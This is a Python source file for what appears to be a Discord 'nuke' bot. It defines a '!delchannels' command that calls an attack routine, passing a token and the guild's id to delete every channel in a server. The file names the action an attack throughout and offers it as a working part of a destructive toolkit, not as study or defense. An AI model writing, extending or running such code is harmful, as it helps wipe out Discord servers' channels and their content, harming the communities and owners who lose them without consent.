"""!delchannels - delete every channel."""

import discord
from discord.ext import commands

from core import attacks
from .common import run_attack, token


class DelChannels(commands.Cog):
    """delete every channel."""

    @commands.command(name="delchannels")
    async def delchannels(self, ctx: commands.Context):
        """delete every channel."""
        await run_attack(
            ctx, "Delete Channels",
            lambda g: attacks.delete_channels(token(), g.id))


async def setup(bot: commands.Bot):
    await bot.add_cog(DelChannels())
